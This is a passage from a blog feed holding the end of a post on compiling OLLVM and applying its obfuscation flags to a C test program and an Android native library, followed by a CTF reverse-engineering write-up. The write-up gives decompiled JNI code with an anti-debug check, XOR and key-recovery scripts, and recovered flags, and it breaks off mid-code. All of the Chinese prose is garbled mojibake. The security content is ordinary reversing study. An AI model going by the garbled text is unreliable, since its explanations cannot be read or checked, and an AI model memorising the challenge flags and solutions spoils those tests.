‡æ–‡ä»¶é“¾æ¥æˆå¯æ‰§è¡Œæ–‡ä»¶æˆ–åº“</li></ul><p>è‡ª Android NDK r18 å¼€å§‹ï¼ŒGoogle å¼ƒç”¨äº† GCCï¼Œå…¨é¢è½¬å‘ä½¿ç”¨ LLVM&#x2F;Clang ä½œä¸º NDK çš„ç¼–è¯‘å·¥å…·é“¾ï¼ŒClang ä½œä¸º C&#x2F;C++ çš„ç¼–è¯‘å‰ç«¯ï¼Œè´Ÿè´£å°† C&#x2F;C++ ä»£ç ç¼–è¯‘ä¸º LLVM IR</p><p>OLLVM æ˜¯ LLVM çš„ä¸€ä¸ªåˆ†æ”¯ï¼Œå¢åŠ äº†ä»£ç æ··æ·†åŠŸèƒ½ï¼ˆå¦‚æ§åˆ¶æµå¹³å¦åŒ–ã€æŒ‡ä»¤æ›¿æ¢ï¼‰ï¼Œä¸»è¦ç”¨äºä¿æŠ¤äºŒè¿›åˆ¶ä»£ç çš„å®‰å…¨æ€§</p><h1 id="ç¼–è¯‘ollvm"><a href="#ç¼–è¯‘ollvm" class="headerlink" title="ç¼–è¯‘ollvm"></a>ç¼–è¯‘ollvm</h1><p>ç›´æ¥çš„ollvm-4.0ç‰ˆæœ¬å¤ªæ—§ï¼Œäºæ˜¯é€‰æ‹©ä¸‹è½½llvmæºç è¿›è¡Œç¼–è¯‘</p><p>å¤åˆ¶obfuscationç­‰æ–‡ä»¶ä¹‹åå†æ¬¡ç¼–è¯‘</p><p>ä¸€å¼€å§‹å°è¯•ç”¨ninjaæ„å»º</p><p>cmake -G â€œNinjaâ€ -DCMAKE_BUILD_TYPE&#x3D;Release -DLLVM_ENABLE_PROJECTS&#x3D;â€llvm;clang;lldâ€                -DLLVM_ENABLE_RTTI&#x3D;OFF -DLLVM_ENABLE_EH&#x3D;OFF ..&#x2F;llvm</p><img src="/2025/04/01/OLLVM%E6%B7%B7%E6%B7%86so%E6%96%87%E4%BB%B6%E5%88%9D%E6%8E%A2/1743159822205-8b0f9a87-25e7-4207-8435-96f0e09a7b96.png" class="" title="img"><p>å¢åŠ ollvmç›¸å…³å†…å®¹åå†æ¬¡ç¼–è¯‘æœ‰æŠ¥é”™ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆåœ¨ç”¨æœ¬åœ°çš„MinGW-w64ç¼–è¯‘å¯¼è‡´æŠ¥é”™</p><img src="/2025/04/01/OLLVM%E6%B7%B7%E6%B7%86so%E6%96%87%E4%BB%B6%E5%88%9D%E6%8E%A2/1743216809784-970daca6-070d-4a82-902a-733d127254df.png" class="" title="img"><p>è¦ä¸ç„¶å°±å¾—é‡æ–°ç”¨Visual Studioç¼–è¯‘</p><img src="/2025/04/01/OLLVM%E6%B7%B7%E6%B7%86so%E6%96%87%E4%BB%B6%E5%88%9D%E6%8E%A2/1743493783240-bbebed05-923e-4fc0-bfe1-3d153830ad38.png" class="" title="img"><p>è¿™é‡Œè¿˜æœ‰ä¸€ç§æ–¹æ³•å°±æ˜¯æ‰¾å·²ç»ç¼–è¯‘å¥½çš„ï¼Œåªè¦ä¸éœ€è¦çš„ç‰ˆæœ¬ç›¸è¿‘ï¼Œå¯ä»¥å»githubæ‰¾æˆ–è€…ç›´æ¥åœ¨æµè§ˆå™¨æœç´¢</p><p>æˆ‘åé¢å°±æ˜¯ç›´æ¥ç”¨çš„ç¼–è¯‘å¥½çš„ollvm</p><p><a href="https://www.bilibili.com/opus/943544163969794072">æ„å»ºå«æœ‰ollvmåŠŸèƒ½çš„LLVM(clang-cl)ä¾›Microsoft Visual Studio 2022ä½¿ç”¨ - å“”å“©å“”å“©</a></p><p>ç›¸å…³çš„é€‰é¡¹</p><p><a href="https://github.com/HikariObfuscator/Hikari/wiki/Usage">https://github.com/HikariObfuscator/Hikari/wiki/Usage</a></p><h1 id="åŠŸèƒ½ä¸ä½¿ç”¨"><a href="#åŠŸèƒ½ä¸ä½¿ç”¨" class="headerlink" title="åŠŸèƒ½ä¸ä½¿ç”¨"></a>åŠŸèƒ½ä¸ä½¿ç”¨</h1><p>ä¸åŒollvmé€‰é¡¹ç¨æœ‰ä¸åŒï¼Œä½†å¤§è‡´å¦‚ä¸‹</p><ul><li>æ§åˆ¶æµæ‰å¹³åŒ–ï¼ˆ-mllvm -flaï¼‰ï¼šé€šè¿‡æ‰å¹³åŒ–æ§åˆ¶æµï¼Œä½¿ä»£ç çš„æ‰§è¡Œè·¯å¾„å˜å¾—å¤æ‚ä¸”éš¾ä»¥ç†è§£ï¼Œä»è€Œå¢åŠ é€†å‘å·¥ç¨‹çš„éš¾åº¦</li><li>æŒ‡ä»¤æ›¿æ¢ï¼ˆ-mllvm -subï¼‰ï¼šç”¨ç­‰æ•ˆä½†ä¸åŒçš„æŒ‡ä»¤åºåˆ—æ›¿æ¢åŸæœ‰æŒ‡ä»¤ï¼Œå¢åŠ ä»£ç é˜…è¯»å’Œåˆ†æçš„å¤æ‚åº¦</li><li>è™šå‡æ§åˆ¶æµç¨‹ï¼ˆ-mllvm -bcfï¼‰ï¼šåœ¨ä»£ç ä¸­æ’å…¥è™šå‡çš„æ§åˆ¶æµå’Œé€»è¾‘ï¼Œä½¿å¾—ä»£ç çœ‹èµ·æ¥æ··ä¹±ä¸”éš¾ä»¥æ¨ç†</li><li>å­—ç¬¦ä¸²åŠ å¯†ï¼ˆ-mllvm -sobfï¼‰ï¼šå¯¹å­—ç¬¦ä¸²è¿›è¡ŒåŠ å¯†å¤„ç†ï¼Œé˜²æ­¢å­—ç¬¦ä¸²åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­è¢«è½»æ˜“è¯†åˆ«å’Œè§£æ</li></ul><p>æµ‹è¯•ä»£ç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> a = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> b = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> sum;<br><br>    <span class="hljs-comment">// æ‰§è¡ŒåŠ æ³•è¿ç®—</span><br>    sum = a + b;<br><br>    <span class="hljs-comment">// è¾“å‡ºè¿ç®—ç»“æœ</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Result: %d + %d = %d\n&quot;</span>, a, b, sum);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ²¡åŠ ä»»ä½•æ··æ·†</p><img src="/2025/04/01/OLLVM%E6%B7%B7%E6%B7%86so%E6%96%87%E4%BB%B6%E5%88%9D%E6%8E%A2/1743493976430-d178aa19-d08e-4de9-9216-f78fd3ae6514.png" class="" title="img"><p>.\clang.exe add.c -o add.exe  -mllvm -enable-allobf  -mllvm -bcf_prob&#x3D;100</p><p>ä½¿ç”¨æ··æ·†å‡ºç°ä¸€ä¸‡å¤šè¡Œçš„ä»£ç ä»¥åŠæå…¶å¤æ‚çš„æµç¨‹å›¾ï¼Œè¿™æ•ˆæœçœ‹ä¸Šå»å°±ä¸é”™</p><img src="/2025/04/01/OLLVM%E6%B7%B7%E6%B7%86so%E6%96%87%E4%BB%B6%E5%88%9D%E6%8E%A2/1743494028604-ba709fbb-a98f-4877-9527-29fe9616380f.png" class="" title="img"><p>åœ¨Android Studioçš„CMakeList.txtä¸­æ·»åŠ é€‰é¡¹</p><img src="/2025/04/01/OLLVM%E6%B7%B7%E6%B7%86so%E6%96%87%E4%BB%B6%E5%88%9D%E6%8E%A2/1743494085671-07f42b74-8ede-447a-a2f8-b85f3940f497.png" class="" title="img"><p>æœ€åè¾¾åˆ°äº†ä¸€å®šçš„æ··æ·†æ•ˆæœï¼šæµç¨‹å›¾æ”¹å˜&#x2F;ç¨‹åºé€»è¾‘æ··ä¹±+å­˜åœ¨è™šå‡ä»£ç +å…³é”®ç®—æ³•æ··æ·†</p><img src="/2025/04/01/OLLVM%E6%B7%B7%E6%B7%86so%E6%96%87%E4%BB%B6%E5%88%9D%E6%8E%A2/1743494143067-8b1120f1-bd58-4439-9718-d2c57d0f9901.png" class="" title="img"><img src="/2025/04/01/OLLVM%E6%B7%B7%E6%B7%86so%E6%96%87%E4%BB%B6%E5%88%9D%E6%8E%A2/1743494357728-8d6d0dd5-f0ab-491d-96fe-ff9e2a6b8c69.png" class="" title="img"><img src="/2025/04/01/OLLVM%E6%B7%B7%E6%B7%86so%E6%96%87%E4%BB%B6%E5%88%9D%E6%8E%A2/1743494446126-6b989a00-66fa-40af-9d35-f236f7ef359f.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>ä½œä¸šä¸é¡¹ç›®æ€»ç»“</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2025æ•°å­—ä¸­å›½APPèµ›é“å®‰å…¨ç§¯åˆ†äº‰å¤ºèµ›åˆèµ›wp</title>
    <link href="/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/"/>
    <url>/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/</url>
    
    <content type="html"><![CDATA[<h1 id="app4"><a href="#app4" class="headerlink" title="app4"></a>app4</h1><p>æ‰‹å¿«æŠ¢äº†ä¸ªç­¾åˆ°é¢˜ä¸€è¡€</p><p>æœ‰æ··æ·†ï¼Œç”¨jebæŸ¥çœ‹ä»£ç </p><img src="/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/1743253539772-37349d34-0eaf-455c-9d1c-f166921c038f.png" class="" title="img"><p>å‘ç°æœ‰md5å¸¸æ•°ï¼ŒçŒœæµ‹ç›´æ¥æ˜¯md5</p><img src="/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/1743253522707-d00448e7-c96b-4b71-9339-03e6311e1b37.png" class="" title="img"><p>åœ¨çº¿å¾—åˆ°flag</p><img src="/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/1743253576206-6753ef22-0c11-4c71-a0f6-72070b834a3e.png" class="" title="img"><h1 id="babyapk"><a href="#babyapk" class="headerlink" title="babyapk"></a>babyapk</h1><p>baby_xorå‡½æ•°åœ¨soå±‚</p><img src="/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/1743253637828-60979be7-f55a-45b4-842d-9d32fce305ba.png" class="" title="img"><img src="/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/1743219875403-6d403ec7-e9de-4f38-b06a-6dabf1dbda54.png" class="" title="img"><p>ç”¨ç»™çš„keyè§£å¯†å‘ç°ä¸€ç›´ä¸å¯¹ï¼Œä¹Ÿæ²¡æ‰¾åˆ°äº¤å‰å¼•ç”¨</p><img src="/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/1743253687445-844edbd1-88bc-4656-b473-2c63f73d7fd6.png" class="" title="img"><p>init_arrayæ‰¾åˆ°ä¿®æ”¹ç‚¹</p><img src="/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/1743253747717-879d4c13-41a4-4359-8ab1-69ce0e2fef34.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">c=[<span class="hljs-number">119</span>, <span class="hljs-number">9</span>, <span class="hljs-number">40</span>, <span class="hljs-number">44</span>, <span class="hljs-number">106</span>, <span class="hljs-number">84</span>, <span class="hljs-number">113</span>, <span class="hljs-number">124</span>, <span class="hljs-number">34</span>, <span class="hljs-number">93</span>, <span class="hljs-number">122</span>, <span class="hljs-number">121</span>, <span class="hljs-number">119</span>, <span class="hljs-number">4</span>, <span class="hljs-number">120</span>, <span class="hljs-number">124</span>, <span class="hljs-number">36</span>, <span class="hljs-number">7</span>, <span class="hljs-number">127</span>, <span class="hljs-number">42</span>, <span class="hljs-number">117</span>, <span class="hljs-number">6</span>, <span class="hljs-number">112</span>, <span class="hljs-number">41</span>, <span class="hljs-number">32</span>, <span class="hljs-number">4</span>, <span class="hljs-number">112</span>, <span class="hljs-number">47</span>, <span class="hljs-number">119</span>, <span class="hljs-number">81</span>, <span class="hljs-number">123</span>, <span class="hljs-number">47</span>, <span class="hljs-number">33</span>, <span class="hljs-number">81</span>, <span class="hljs-number">40</span>, <span class="hljs-number">120</span>, <span class="hljs-number">114</span>, <span class="hljs-number">24</span>]<br>c1=[<span class="hljs-number">0x11</span>,<span class="hljs-number">0x65</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x4b</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c)):<br>    c[i]^=c1[i%<span class="hljs-built_in">len</span>(c1)]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(c[i]),end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment">#flag&#123;1873832fa175b6adc9b1a9df42d04a3c&#125;</span><br></code></pre></td></tr></table></figure><h1 id="magic"><a href="#magic" class="headerlink" title="magic"></a>magic</h1><p>ä¸¤æ¬¡encrypt</p><img src="/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/1743255335798-ff5706fd-46ac-4355-861a-908666ee90d7.png" class="" title="img"><img src="/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/1743255207027-49f6d832-a9f1-4c53-a075-7ebc5cabfac1.png" class="" title="img"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">encrypt</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int8 v4; <span class="hljs-comment">// [rsp+2Fh] [rbp-651h]</span><br>  FILE *v5; <span class="hljs-comment">// [rsp+30h] [rbp-650h]</span><br>  __int64 v6; <span class="hljs-comment">// [rsp+38h] [rbp-648h]</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [rsp+44h] [rbp-63Ch]</span><br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// [rsp+48h] [rbp-638h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4Ch] [rbp-634h]</span><br>  <span class="hljs-type">unsigned</span> __int8 *v10; <span class="hljs-comment">// [rsp+50h] [rbp-630h]</span><br>  <span class="hljs-type">unsigned</span> __int8 *StringUTFChars; <span class="hljs-comment">// [rsp+58h] [rbp-628h]</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [rsp+148h] [rbp-538h] BYREF</span><br>  <span class="hljs-type">socklen_t</span> addr_len; <span class="hljs-comment">// [rsp+14Ch] [rbp-534h] BYREF</span><br>  <span class="hljs-type">char</span> s1[<span class="hljs-number">10</span>]; <span class="hljs-comment">// [rsp+150h] [rbp-530h] BYREF</span><br>  <span class="hljs-type">char</span> v15[<span class="hljs-number">246</span>]; <span class="hljs-comment">// [rsp+15Ah] [rbp-526h] BYREF</span><br>  <span class="hljs-type">char</span> v16[<span class="hljs-number">1032</span>]; <span class="hljs-comment">// [rsp+250h] [rbp-430h] BYREF</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> <span class="hljs-title">v17</span>;</span> <span class="hljs-comment">// [rsp+658h] [rbp-28h] BYREF</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> <span class="hljs-title">addr</span>;</span> <span class="hljs-comment">// [rsp+668h] [rbp-18h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v19; <span class="hljs-comment">// [rsp+678h] [rbp-8h]</span><br><br>  v19 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  StringUTFChars = (<span class="hljs-type">unsigned</span> __int8 *)_JNIEnv::GetStringUTFChars(a1, a3, <span class="hljs-number">0LL</span>);<br>  v10 = (<span class="hljs-type">unsigned</span> __int8 *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>uLL);<br>  addr_len = <span class="hljs-number">16</span>;<br>  fd = socket(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( fd &lt; <span class="hljs-number">0</span> )<br>    __android_log_print(<span class="hljs-number">6LL</span>, <span class="hljs-string">&quot;NativeSocket&quot;</span>, <span class="hljs-string">&quot;TCP socket creation failed&quot;</span>);<br>  addr.sa_family = <span class="hljs-number">2</span>;<br>  addr.sa_data[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;<br>  *(_WORD *)&amp;addr.sa_data[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">strcpy</span>(addr.sa_data, <span class="hljs-string">&quot;09&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( bind(fd, &amp;addr, <span class="hljs-number">0x10</span>u) )<br>  &#123;<br>    __android_log_print(<span class="hljs-number">6LL</span>, <span class="hljs-string">&quot;NativeSocket&quot;</span>, <span class="hljs-string">&quot;TCP bind failed&quot;</span>);<br>    close(fd);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( listen(fd, <span class="hljs-number">5</span>) &lt; <span class="hljs-number">0</span> )<br>  &#123;<br>    __android_log_print(<span class="hljs-number">6LL</span>, <span class="hljs-string">&quot;NativeSocket&quot;</span>, <span class="hljs-string">&quot;TCP listen failed&quot;</span>);<br>    close(fd);<br>  &#125;<br>  __android_log_print(<span class="hljs-number">3LL</span>, <span class="hljs-string">&quot;NativeSocket&quot;</span>, <span class="hljs-string">&quot;TCP Server listening on port %d...&quot;</span>, <span class="hljs-number">12345LL</span>);<br>  v7 = accept(fd, &amp;v17, &amp;addr_len);<br>  <span class="hljs-keyword">if</span> ( v7 &lt; <span class="hljs-number">0</span> )<br>  &#123;<br>    __android_log_print(<span class="hljs-number">6LL</span>, <span class="hljs-string">&quot;NativeSocket&quot;</span>, <span class="hljs-string">&quot;TCP accept failed&quot;</span>);<br>    close(fd);<br>  &#125;<br>  v6 = __recvfrom_chk((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v7, key, <span class="hljs-number">16LL</span>, <span class="hljs-number">17LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">if</span> ( v6 &gt;= <span class="hljs-number">0</span> )<br>  &#123;<br>    v16[v6] = <span class="hljs-number">0</span>;<br>    __android_log_print(<span class="hljs-number">3LL</span>, <span class="hljs-string">&quot;NativeSocket&quot;</span>, <span class="hljs-string">&quot;TCP Received: %s&quot;</span>, v16);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    __android_log_print(<span class="hljs-number">6LL</span>, <span class="hljs-string">&quot;NativeSocket&quot;</span>, <span class="hljs-string">&quot;TCP recv failed&quot;</span>);<br>  &#125;<br>  close(v7);<br>  close(fd);<br>  v5 = fopen(<span class="hljs-string">&quot;/proc/self/status&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>  v12 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( __fgets_chk(s1, <span class="hljs-number">256LL</span>, v5, <span class="hljs-number">256LL</span>) )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(s1, <span class="hljs-string">&quot;TracerPid:&quot;</span>, <span class="hljs-number">0xA</span>uLL) )<br>    &#123;<br>      <span class="hljs-built_in">sscanf</span>(v15, <span class="hljs-string">&quot;%d&quot;</span>, &amp;v12);<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  fclose(v5);<br>  v4 = v12;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; ++i )<br>  &#123;<br>    v4 = sub_2AC0(v4);<br>    key[i] ^= v4;<br>  &#125;<br>  aesEncrypt(key, <span class="hljs-number">0x10</span>u, StringUTFChars, v10, <span class="hljs-number">0x10</span>u);<br>  __memcpy_chk(&amp;data, v10, <span class="hljs-number">16LL</span>, <span class="hljs-number">25LL</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ ¹æ®ä»£ç æ‰¾åˆ°åŸå§‹key</p><img src="/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/1743253324744-0d359a06-bfac-452c-a422-e1b35e427368.png" class="" title="img"><p>æ¨¡æ‹Ÿå¼‚æˆ–å¾—åˆ°çœŸæ­£çš„key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0x12</span>,<span class="hljs-number">0x34</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0x88</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x21</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x34</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x30</span>,<span class="hljs-number">0x64</span>]<br>v4=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    v4=(<span class="hljs-number">0x99</span>*v4-<span class="hljs-number">1</span>)%<span class="hljs-number">256</span><br>    a[i]^=v4<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(a[i]),end=<span class="hljs-string">&quot;,&quot;</span>)<br><span class="hljs-comment">#0xed,0x52,0xa0,0xa,0xfc,0x9a,0x82,0x79,0xe7,0xa,0x7e,0xb7,0x74,0x98,0xe9,0xd4</span><br></code></pre></td></tr></table></figure><p>å…ˆbase64è§£å¯†å†aes_ecbï¼Œç›´æ¥æ²¡è§£å‡ºæ¥</p><img src="/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/1743255652158-866367a5-df42-4914-95ff-c295a33eae93.png" class="" title="img"><p>sç›’æœ‰é­”æ”¹</p><img src="/2025/03/31/2025%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BDAPP%E8%B5%9B%E9%81%93%E5%AE%89%E5%85%A8%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/1743255586463-5ba7765e-76ff-4669-aa79-218389a5e5a6.png" class="" title="img"><p>æ¯”èµ›æœ€ååŠå°æ—¶åšçš„ï¼Œæ€è·¯é¡ºç•…ä½†æ˜¯çœ‹åˆ°sç›’é­”æ”¹å°±äº”åˆ†é’Ÿäº†ï¼Œaiç›´æ¥ç»™çš„è„šæœ¬æ²¡æœ‰é€†sç›’ï¼Œæœ€åä¹Ÿæ²¡äº¤ä¸Š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 